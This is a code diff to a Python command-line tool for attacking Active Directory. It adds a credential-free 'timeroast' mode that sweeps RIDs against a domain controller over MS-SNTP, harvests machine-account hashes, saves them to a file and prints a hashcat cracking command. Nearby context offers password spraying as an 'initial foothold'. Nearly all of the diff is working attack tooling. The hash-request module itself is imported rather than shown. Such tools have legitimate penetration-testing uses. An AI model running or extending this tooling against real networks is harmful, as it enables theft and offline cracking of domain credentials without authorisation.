@@ -184,6 +184,26 @@ Examples:
                            "from --list-cves). Combine with --aggressive when naming "
                            "an aggressive check (otherwise it's filtered out).")
 
+    # ── No-creds modules (brief §4.5) ────────────────────────────
+    nocreds = p.add_argument_group("No-creds attacks (no -u/-p needed)")
+    nocreds.add_argument("--timeroast", action="store_true",
+                         help="Recover machine-account hashes via MS-SNTP "
+                              "(Tervoort/Secura). Iterates the RID range, "
+                              "sends authenticated NTP requests to the DC, "
+                              "outputs hashcat-31300 hashes. No LDAP, no "
+                              "creds — UDP 123 reachability is the only "
+                              "requirement.")
+    nocreds.add_argument("--timeroast-rids", metavar="START-END", default="1000-1500",
+                         help="RID range to sweep (default 1000-1500). "
+                              "Single int OK: '500'.")
+    nocreds.add_argument("--timeroast-rate", type=int, default=180,
+                         help="Packets/sec rate cap (default 180 — Tervoort default)")
+    nocreds.add_argument("--timeroast-timeout", type=float, default=5.0,
+                         help="Per-RID socket timeout in seconds (default 5)")
+    nocreds.add_argument("--timeroast-out", metavar="FILE",
+                         help="Append captured hashes to FILE (one per line). "
+                              "Without this, hashes go to stdout only.")
+
     # ── Password spray (brief §4.8) ──────────────────────────────
     spray = p.add_argument_group("Password spray (gated, lockout-aware)")
     spray.add_argument("--spray", action="store_true",
@@ -954,6 +974,10 @@ def main():
         cmd_list_resumable()
         return
 
+    if args.timeroast:
+        cmd_timeroast(args)
+        return
+
     if args.spray:
         cmd_spray(args)
         return
@@ -1082,6 +1106,52 @@ def cmd_spray(args):
     log.success(
         f"{len(result.hits)} hit(s) in {result.attempts} attempts. "
         f"Use the SAM:password pairs above as your initial foothold."
+    )
+
+
+def cmd_timeroast(args):
+    """No-creds standalone — UDP 123 to the DC. No LDAP, no auth."""
+    from kerb_map.modules.timeroast import parse_rid_range, timeroast
+
+    if not args.dc_ip:
+        log.error("--timeroast needs -dc <DC_IP>. No domain or auth required.")
+        sys.exit(1)
+
+    try:
+        rids = parse_rid_range(args.timeroast_rids)
+    except ValueError as e:
+        log.error(f"Bad --timeroast-rids: {e}")
+        sys.exit(1)
+
+    log.section(
+        f"Timeroast — RIDs {rids.start}..{rids.stop - 1} on {args.dc_ip}:123/udp"
+    )
+    log.info(
+        f"Rate cap: {args.timeroast_rate} pps · timeout: {args.timeroast_timeout}s · "
+        f"silent skips are normal (RIDs without machine accounts)"
+    )
+
+    out_fh = open(args.timeroast_out, "a") if args.timeroast_out else None
+    captured = 0
+    try:
+        for h in timeroast(args.dc_ip, rids,
+                           rate=args.timeroast_rate,
+                           timeout=args.timeroast_timeout):
+            captured += 1
+            console.print(f"  [green]RID {h.rid:>5}[/green]  {h.hashcat}")
+            if out_fh:
+                out_fh.write(h.hashcat + "\n")
+                out_fh.flush()
+    except KeyboardInterrupt:
+        log.warn("Interrupted — partial results above are still valid.")
+    finally:
+        if out_fh:
+            out_fh.close()
+
+    log.success(
+        f"Captured {captured} hash(es). "
+        f"Crack with: hashcat -m 31300 <hashfile> <wordlist>"
+        + (f"\n  Output written to {args.timeroast_out}" if args.timeroast_out else "")
     )
 
 
